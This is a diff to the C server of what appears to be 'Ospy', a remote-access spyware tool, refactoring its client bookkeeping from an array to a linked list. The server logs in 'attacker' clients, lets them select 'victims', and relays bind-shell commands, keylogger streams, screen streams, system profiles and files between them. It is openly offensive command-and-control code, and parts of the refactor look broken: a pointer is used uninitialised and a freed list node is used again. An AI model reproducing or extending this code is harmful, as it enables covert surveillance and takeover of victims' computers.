@@ -1,7 +1,7 @@
 #include "entering_to_Ospy.h"
 #include "connection.h"
 
-int main (){
+int main (){	
 	FILE * events_log = fopen("events_log.log", "a");
 	if (events_log == NULL){
 		printf("Can't opening log file\n");
@@ -15,6 +15,9 @@ int main (){
 	srand (time(0)); // make the random funtion real random
 	
 	initialize_connection (); 
+	
+	int num_of_connected_clients = 0;
+	client_ptr curr_client; // poss of link list
 	
 	encrypted_general_message_protocol message;
 	registration_status registering_final_status;
@@ -32,7 +35,7 @@ int main (){
 		FD_SET(master_socket, &readfds); 
 		max_socket_descriptor = master_socket;
 	
-		add_child_sockets_to_set();
+		add_child_sockets_to_set(&clients);
 			
 		//wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely 
 		activity = select( max_socket_descriptor + 1 , &readfds , NULL , NULL , NULL); 
@@ -52,21 +55,21 @@ int main (){
 			fprintf(events_log,"%s : New connection , socket fd is %d , ip is : %s , port : %d\n",curr_time, new_socket, inet_ntoa(address.sin_addr) , ntohs (address.sin_port));
 			fflush(events_log);
 			//add new socket to array of sockets 
-			for (int i = 0; i < MAX_CLIENTS; i++){ 
-				//if position is empty
-				if( clients_list[i].socket_fd == 0 ) { 
-					clients_list[i].socket_fd = new_socket; 
-					//printf("Adding to list of sockets as %d\n" , i); 
-					fprintf(events_log, "%s : Adding to list of sockets as %d\n", curr_time, i);
-					fflush(events_log);
-					break; 
-				}
-			}
+			insert_client(2, new_socket, 0, "", "", &clients);
+			num_of_connected_clients++;
+			print_clients_list(clients);
+			
+			fprintf(events_log, "%s : Adding to list of sockets as %d\n", curr_time, new_socket);
+			fflush(events_log);
 		}
 		
 		//else its some IO operation on some other socket 
-		for (int i = 0; i < MAX_CLIENTS; i++) {
-			socket_descriptor = clients_list[i].socket_fd;
+		for (int i = 0; i < num_of_connected_clients; i++){
+			if(curr_client == NULL)
+				curr_client = clients; // if way get to the end of the clients link list -> go to the head of the link list
+			
+			socket_descriptor = curr_client->socket_fd;
+			
 			if (FD_ISSET( socket_descriptor , &readfds)) {
 				//Check if it was for closing , and also read the incoming message
 				if (read(socket_descriptor, &message, sizeof(encrypted_general_message_protocol)) == 0) { 
@@ -76,11 +79,10 @@ int main (){
 					fflush(events_log);
 					
 					//Close the socket and mark as 0 in list for urses 
-					close(socket_descriptor); 
-					clients_list[i].socket_fd = 0; 
-					clients_list[i].other_side_sfd = 0;
-					memset(clients_list[i].id, '\0', strlen(clients_list[i].id));
-					memset(clients_list[i].name, '\0', strlen(clients_list[i].name));
+					close(socket_descriptor);
+					remove_client(socket_descriptor, &clients); // removeing the disconnected client by his socket_descriptor
+					num_of_connected_clients --;
+					print_clients_list(clients);
 				}
 				else {
 					if (message.i_am == ATTACKER){
@@ -89,8 +91,9 @@ int main (){
 								loging_in_status = log_in_attacker(decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY), decrypt_text(message.data.encrypted_login_to_Ospy.password, AES_KEY));
 								send(socket_descriptor, &loging_in_status, sizeof(registration_status), 0);
 								if (loging_in_status == SUCCESS){// if attacker loged in -connect he's id the hes socket descriptor
-									strcpy(clients_list[i].id, decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY)); // set attackers id = user name
-									clients_list[i].i_am = ATTACKER; // declare this client as attacker
+									strcpy(curr_client->id, decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY)); // set attackers id = user name
+									curr_client->i_am = ATTACKER; // declare this client as attacker
+									print_clients_list(clients);
 								}
 								
 								break;
@@ -109,32 +112,31 @@ int main (){
 								break;
 							
 							case GET_CONNECTED_VICTM :
-								send_to_attacker_connected_victims(clients_list[i]);
+								send_to_attacker_connected_victims (curr_client, clients, num_of_connected_clients);
 								
 								break;
 								
 							case SELECT_VICTIM :
-								set_attacker_victim_connection (&clients_list[i], message.data.selected_victim_name); 								
+								set_attacker_victim_connection (&curr_client, &clients, num_of_connected_clients, message.data.selected_victim_name);
 								break;
 								
 							case SEND_BIND_SHELL_COMMAND :
-								send(clients_list[i].other_side_sfd, &message.action, sizeof(message.action), 0);
-								send(clients_list[i].other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
+								send(curr_client->other_side_sfd, &message.action, sizeof(message.action), 0);
+								send(curr_client->other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
 								
 								break;
 								
 							default :
-								printf("%d",message.action);
-								send(clients_list[i].other_side_sfd, &message.action, sizeof(message.action), 0);
+								send(curr_client->other_side_sfd, &message.action, sizeof(message.action), 0);
 								break;	
 						}
 					}
 					else if (message.i_am == VICTIM){
 						switch (message.action){
 							case LOG_IN :
-								strcpy(clients_list[i].name, decrypt_text(message.data.encrypted_login_vicim_to_Ospy.victim_name, AES_KEY));
-								strcpy(clients_list[i].id, message.data.encrypted_login_vicim_to_Ospy.id);
-								clients_list[i].i_am = VICTIM;
+								strcpy(curr_client->name, decrypt_text(message.data.encrypted_login_vicim_to_Ospy.victim_name, AES_KEY));
+								strcpy(curr_client->id, message.data.encrypted_login_vicim_to_Ospy.id);
+								curr_client->i_am = VICTIM;
 								
 								break;
 								
@@ -143,13 +145,13 @@ int main (){
 							case GET_SYSTEM_PROFILER :
 							case GET_SCREEN_STREAM :
 							case SEND_BIND_SHELL_COMMAND :
-								send(clients_list[i].other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
+								send(curr_client->other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
 								
 								break;
 								
 							case GET_KEYSTROKES_STREAM :
 								//printf("\n%s",message.data.keylogger_stream_key);
-								send(clients_list[i].other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
+								send(curr_client->other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
 								
 								break;	
 								
@@ -159,7 +161,8 @@ int main (){
 						}
 					}
 				} 
-			} 
+			}
+			curr_client = curr_client->next_client;
 		} 
 	}
 	fclose(events_log);
